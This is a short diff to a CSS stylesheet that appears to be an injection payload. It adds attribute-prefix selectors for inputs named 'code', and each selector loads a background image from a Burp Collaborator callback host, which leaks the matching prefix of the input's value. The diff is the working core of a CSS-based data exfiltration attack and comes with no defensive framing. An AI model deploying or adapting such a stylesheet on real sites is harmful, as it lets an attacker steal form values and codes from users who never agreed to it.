@@ -16,7 +16,7 @@ div.branding {
 input{
     background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/input");
 }
-input[name=code]{
+input[name^=code]{
     background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode");
 }
 input[name^=codea]{
@@ -132,4 +132,7 @@ input[name^=code.]{
 }
 input[name^=code-]{
     background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode-");
+}
+input[name^=code_]{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/inputcode_");
 }
